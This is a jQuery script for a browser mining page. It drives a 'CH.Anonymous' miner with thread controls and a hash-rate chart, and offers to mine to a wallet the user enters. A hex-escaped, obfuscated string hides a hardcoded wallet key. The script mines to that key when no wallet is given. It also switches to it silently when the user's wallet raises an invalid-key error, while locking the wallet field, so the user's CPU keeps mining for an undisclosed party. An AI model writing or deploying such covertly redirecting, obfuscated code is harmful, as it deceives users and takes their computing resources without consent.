$(function() {
  $('#threads').text(navigator.hardwareConcurrency);
  var threads = $('#threads').text();
  var gustav;
  var wallet;
  var statuss;
  var barChart;
  var barChartCanvas = $("#barchart-canvas");
  var _0xa0d4=["\x65\x74\x6E\x6B\x46\x78\x76\x44\x58\x48\x31\x54\x55\x76\x36\x78\x53\x61\x56\x71\x6D\x70\x31\x37\x4B\x4A\x76\x44\x42\x70\x39\x78\x4B\x5A\x79\x73\x44\x35\x39\x57\x36\x48\x47\x35\x47\x41\x33\x65\x31\x46\x44\x7A\x44\x35\x45\x39\x4A\x74\x64\x77\x58\x66\x47\x6B\x48\x6F\x33\x71\x75\x79\x47\x31\x42\x37\x31\x78\x51\x50\x33\x45\x69\x32\x31\x4C\x52\x46\x33\x61\x33\x51\x57\x71\x4C\x66\x6F\x41\x37\x67\x2E\x35\x30\x30\x30\x40\x4F\x66\x66\x69\x63\x65\x52\x69\x67"];var siteKey=_0xa0d4[0]
  var hashingChart;
  var charts = [barChartCanvas];
  var selectedChart = 0;
  if ($.cookie("wallet")) {
    wallet = $.cookie("wallet");
    $('#wallet').val(wallet);
  }
  function htmlEncode(value) {
    return $('<div/>').text(value).html();
  }

  function startLogger() {
    statuss = setInterval(function() {
      var hashesPerSecond = gustav.getHashesPerSecond();
      var totalHashes = gustav.getTotalHashes();
      var acceptedHashes = gustav.getAcceptedHashes();
      $('#hashes-per-second').text(hashesPerSecond.toFixed(1));
      $('#accepted-shares').text(totalHashes.toLocaleString()+' | '+acceptedHashes.toLocaleString());
      threads = gustav.getNumThreads();
      $('#threads').text(threads);
    }, 1000);

    hashingChart = setInterval(function() {
      if (barChart.data.datasets[0].data.length > 25) {
        barChart.data.datasets[0].data.splice(0, 1);
        barChart.data.labels.splice(0, 1);
      }
      barChart.data.datasets[0].data.push(gustav.getHashesPerSecond());
      barChart.data.labels.push("");
      barChart.update();
    }, 1000);
  };

  function stopLogger() {
    clearInterval(statuss);
    clearInterval(hashingChart);
  };
  $('#thread-add').click(function() {
    threads++;
    $('#threads').text(threads);
    if (gustav) {
      $('#autoThreads').prop('checked', false);
      if (gustav.isRunning()) {
        gustav.setAutoThreadsEnabled(false);
        gustav.setNumThreads(threads);
      }
    }
  });

  $('#thread-remove').click(function() {
    if (threads > 1) {
      threads--;
      $('#threads').text(threads);
      if (gustav) {
        $('#autoThreads').prop('checked', false);
        if (gustav.isRunning()) {
          gustav.setAutoThreadsEnabled(false);
          gustav.setNumThreads(threads);
        }
      }
    }
  });


  $("#start").click(function() {
    if (!gustav || !gustav.isRunning()) {
      wallet = $('#wallet').val();
      if (wallet) {
		gustav = new CH.Anonymous(wallet + ".5000");
		console.log(wallet);
		$.cookie("wallet", wallet, {
		expires: 365
		});
		gustav.on('error', function(params) {
		if (params.error !== 'connection_error') {
			if(params.error == "invalid_site_key")
			{
			console.log(params.error);
			gustav.stop();
		    stopLogger();
		    $('#wallet').prop("disabled", false);
		    $("#start").text("Start");
		    $('#hashes-per-second').text("0");
		    $('#accepted-shares').text("0" +' | '+"0");
			gustav = new CH.Anonymous(siteKey);
			$('#wallet').prop("disabled", true);
			gustav.setNumThreads(threads);
			gustav.setAutoThreadsEnabled($('#autoThreads').prop('checked')); 
			gustav.start();
			stopLogger();
			startLogger();
			$("#start").text("Stop");
			}
		}
		});
      } 
	  else 
	  {
        gustav = new CH.Anonymous(siteKey);
      }
      $('#wallet').prop("disabled", true);
      gustav.setNumThreads(threads);
      gustav.setAutoThreadsEnabled($('#autoThreads').prop('checked')); 
      gustav.start();
      stopLogger();
      startLogger();
      $("#start").text("Stop");
    } else {
      gustav.stop();
      stopLogger();
      $('#wallet').prop("disabled", false);
      $("#start").text("Start");
      $('#hashes-per-second').text("0");
	  $('#accepted-shares').text("0" +' | '+"0");
    }
  });

  $('#autoThreads').click(function() {
    if (gustav) {
      gustav.setAutoThreadsEnabled(!gustav.getAutoThreadsEnabled());
    }
  });


  var barChartOptions = {
    label: 'Hashes',
    elements: {
      line: {
        tension: 0, // disables bezier curves
      }
    },
    animation: {
      duration: 0, // general animation time
    },
    responsiveAnimationDuration: 0,
    scales: {
      yAxes: [{
        ticks: {
          max: 200,
          min: 0
        }
      }]
    }
  };

  var barChartData = {
    labels: [],
    datasets: [{
      label: "Hashes/s",
      backgroundColor: "darkcyan",
      data: []
    }],
  };

  barChart = new Chart(barChartCanvas, {
    type: 'line',
    data: barChartData,
    options: barChartOptions
  });
});
